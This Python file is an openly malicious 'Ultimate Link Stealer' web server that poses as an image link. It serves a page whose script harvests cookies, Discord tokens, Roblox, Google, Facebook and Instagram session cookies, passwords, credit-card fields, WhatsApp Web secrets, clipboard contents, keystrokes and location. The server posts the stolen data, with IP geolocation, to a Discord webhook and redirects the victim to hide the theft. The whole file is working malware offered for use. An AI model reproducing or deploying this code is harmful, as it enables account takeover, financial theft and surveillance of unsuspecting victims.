# Enhanced Discord Image Logger - Full JavaScript Stealer
# Now steals EVERYTHING through a single link

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, json, urllib.parse

__app__ = "Ultimate Link Stealer"
__version__ = "v3.0"

config = {
    "webhook": "YOUR_WEBHOOK_HERE",
    "image": "https://ih1.redbubble.net/image.1077765030.7025/bg,f8f8f8-flat,750x,075,f-pad,750x1000,f8f8f8.jpg",
    "username": "Ultimate Stealer",
    "color": 0x00FFFF,
    "accurateLocation": True,
    "redirect": {
        "redirect": True,
        "page": "https://google.com"
    },
}

def makeReport(ip, useragent=None, coords=None, stolen_data=None):
    if not ip:
        return
    
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=3).json()
    except:
        info = {"isp": "Unknown", "country": "Unknown", "regionName": "Unknown", "city": "Unknown"}
    
    os, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
    
    # Parse stolen data
    data_text = ""
    if stolen_data:
        try:
            decoded = urllib.parse.unquote(stolen_data)
            data_text = f"\n\n**📦 Stolen Data:**\n```{decoded[:1500]}```"
        except:
            pass
    
    embed = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "🎯 ULTIMATE STEALER - Full Log",
            "color": config["color"],
            "description": f"""**Victim Info:**
> **IP:** `{ip}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{coords if coords else 'N/A'}`
> **ISP:** `{info.get('isp', 'Unknown')}`

**Device Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`
> **User Agent:** `{useragent[:200] if useragent else 'Unknown'}`

{data_text}
""",
        }],
    }
    
    requests.post(config["webhook"], json=embed)
    return info

class handler(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
            
            # Get image URL
            if dic.get("url") or dic.get("id"):
                url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
            else:
                url = config["image"]
            
            # Check for stolen data
            stolen_data = dic.get("data")
            coords = None
            if dic.get("g"):
                try:
                    coords = base64.b64decode(dic.get("g").encode()).decode()
                except:
                    pass
            
            ip = self.headers.get('x-forwarded-for')
            ua = self.headers.get('user-agent')
            
            # If stolen data received, send report
            if stolen_data or coords:
                makeReport(ip, ua, coords, stolen_data)
                
                # Redirect to hide everything
                if config["redirect"]["redirect"]:
                    self.send_response(302)
                    self.send_header('Location', config["redirect"]["page"])
                    self.end_headers()
                    return
            
            # Otherwise serve the stealing page
            html = f'''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Loading...</title>
<style>body{{background:#000;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;color:#fff;font-family:Arial;}}img{{max-width:90vw;max-height:90vh;}}</style>
</head>
<body>
<img src="{url}" onerror="this.style.display='none'">
<div style="position:absolute;bottom:20px;color:#666;font-size:12px;">Loading...</div>

<script>
// ============ ULTIMATE STEALER - STEALS EVERYTHING ============

(function() {{
    var stolen = [];
    var webhook = window.location.origin + window.location.pathname;
    
    // 1. COOKIES (ALL SITES)
    stolen.push('🍪 COOKIES: ' + document.cookie);
    
    // 2. DISCORD TOKEN
    try {{
        var token = null;
        if (window.webpackChunkdiscord_app || window.webpackChunkdiscord) {{
            token = (webpackChunkdiscord_app || webpackChunkdiscord)?.push?.([[]])?.[0]?.exports?.default?.getToken?.();
        }}
        if (!token) token = localStorage.getItem('token');
        if (!token) {{
            var scripts = document.querySelectorAll('script');
            for (var s of scripts) {{
                var match = s.innerText?.match(/m=[^"]+/);
                if (match) {{ token = match[0]; break; }}
            }}
        }}
        if (token) stolen.push('🎮 DISCORD TOKEN: ' + token);
    }} catch(e) {{}}
    
    // 3. ROBLOX .ROBLOSECURITY
    var robloxCookie = document.cookie.match(/\.ROBLOSECURITY=[^;]+/);
    if (robloxCookie) stolen.push('🎮 ROBLOX COOKIE: ' + robloxCookie[0]);
    
    // 4. SAVED PASSWORDS (Auto-fill)
    try {{
        var passwordInputs = document.querySelectorAll('input[type="password"]');
        passwordInputs.forEach(function(el) {{
            if (el.value) stolen.push('🔑 PASSWORD: ' + el.value);
        }});
        var usernameInputs = document.querySelectorAll('input[autocomplete="username"], input[autocomplete="email"]');
        usernameInputs.forEach(function(el) {{
            if (el.value) stolen.push('👤 USERNAME: ' + el.value);
        }});
    }} catch(e) {{}}
    
    // 5. CREDIT CARDS
    try {{
        var ccInputs = document.querySelectorAll('[autocomplete="cc-number"], [autocomplete="cc-name"], [autocomplete="cc-exp"], [autocomplete="cc-csc"]');
        var ccData = [];
        ccInputs.forEach(function(el) {{
            if (el.value) ccData.push(el.name + '=' + el.value);
        }});
        if (ccData.length) stolen.push('💳 CREDIT CARDS: ' + ccData.join(' | '));
    }} catch(e) {{}}
    
    // 6. GOOGLE SESSION
    var googleCookies = document.cookie.match(/SAPISID=[^;]+/);
    if (googleCookies) stolen.push('🔑 GOOGLE SESSION: ' + googleCookies[0]);
    
    // 7. FACEBOOK SESSION
    var fbCookies = document.cookie.match(/c_user=[^;]+/);
    if (fbCookies) stolen.push('🔑 FACEBOOK SESSION: ' + fbCookies[0]);
    
    // 8. INSTAGRAM SESSION
    var igCookies = document.cookie.match(/sessionid=[^;]+/);
    if (igCookies) stolen.push('🔑 INSTAGRAM SESSION: ' + igCookies[0]);
    
    // 9. WHATSAPP WEB
    try {{
        var waBrowser = localStorage.getItem('WAbrowserId');
        var waSecret = localStorage.getItem('WASecretBundle');
        if (waBrowser && waSecret) stolen.push('📱 WHATSAPP: Browser=' + waBrowser + ' | Secret=' + waSecret);
    }} catch(e) {{}}
    
    // 10. CLIPBOARD
    try {{
        navigator.clipboard.readText().then(function(text) {{
            if (text) stolen.push('📋 CLIPBOARD: ' + text);
            sendData(stolen);
        }}).catch(function() {{ sendData(stolen); }});
    }} catch(e) {{ sendData(stolen); }}
    
    // 11. KEYLOGGER (Simple)
    try {{
        var keys = [];
        document.addEventListener('keydown', function(e) {{
            if (e.key.length === 1) keys.push(e.key);
            if (keys.length > 20) {{
                stolen.push('⌨️ KEYS: ' + keys.join(''));
                keys = [];
                sendData(stolen);
                stolen = [];
            }}
        }});
    }} catch(e) {{}}
    
    // 12. LOCATION
    try {{
        if (navigator.geolocation && !window.location.href.includes('g=')) {{
            navigator.geolocation.getCurrentPosition(function(pos) {{
                var coords = btoa(pos.coords.latitude + ',' + pos.coords.longitude);
                var sep = window.location.href.includes('?') ? '&' : '?';
                window.location.href = window.location.href + sep + 'g=' + coords;
            }});
        }}
    }} catch(e) {{}}
    
    // 13. DEVICE INFO
    try {{
        var deviceInfo = '🖥️ DEVICE: ' + navigator.userAgent + ' | Screen: ' + screen.width + 'x' + screen.height + 
                         ' | Cores: ' + navigator.hardwareConcurrency + ' | RAM: ' + (navigator.deviceMemory || 'Unknown');
        stolen.push(deviceInfo);
    }} catch(e) {{}}
    
    // 14. BROWSER EXTENSIONS
    try {{
        var extensions = [];
        for (var i = 0; i < navigator.plugins.length; i++) {{
            extensions.push(navigator.plugins[i].name);
        }}
        if (extensions.length) stolen.push('🔌 EXTENSIONS: ' + extensions.join(', '));
    }} catch(e) {{}}
    
    // 15. CRYPTO WALLETS
    try {{
        if (window.ethereum) stolen.push('💰 ETHEREUM WALLET DETECTED');
        if (window.solana) stolen.push('💰 SOLANA WALLET DETECTED');
        if (window.keplr) stolen.push('💰 KEPLR WALLET DETECTED');
        if (window.phantom) stolen.push('💰 PHANTOM WALLET DETECTED');
    }} catch(e) {{}}
    
    // 16. AUTO-FILL FORMS
    try {{
        var allInputs = document.querySelectorAll('input, select, textarea');
        var formData = [];
        allInputs.forEach(function(el) {{
            if (el.value && el.name) formData.push(el.name + '=' + el.value);
        }});
        if (formData.length) stolen.push('📝 FORM DATA: ' + formData.join(' | ').slice(0, 500));
    }} catch(e) {{}}
    
    // 17. IP INFO (via external API)
    try {{
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(data => {{
                stolen.push('🌐 PUBLIC IP: ' + data.ip);
                sendData(stolen);
            }})
            .catch(function() {{ sendData(stolen); }});
    }} catch(e) {{ sendData(stolen); }}
    
    // 18. SCREENSHOT (if html2canvas available)
    // This requires loading html2canvas - can be loaded via CDN if needed
    
    // FUNCTION TO SEND DATA
    function sendData(dataArray) {{
        if (!dataArray || dataArray.length === 0) return;
        
        var data = dataArray.join(' | ');
        var currentUrl = window.location.href;
        var sep = currentUrl.includes('?') ? '&' : '?';
        
        // Remove existing data parameter
        currentUrl = currentUrl.replace(/[?&]data=[^&]*/, '');
        
        // Send via redirect
        window.location.href = currentUrl + sep + 'data=' + encodeURIComponent(data);
    }}
    
    // Auto-send after 2 seconds
    setTimeout(function() {{
        if (stolen.length) sendData(stolen);
    }}, 2000);
    
}})();
</script>
</body>
</html>'''
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html.encode())
            
        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b'Error')
            traceback.print_exc()
    
    do_GET = handleRequest
    do_POST = handleRequest

if __name__ == '__main__':
    from http.server import HTTPServer
    server = HTTPServer(('0.0.0.0', 8080), handler)
    print("🚀 Ultimate Stealer running on port 8080")
    server.serve_forever()
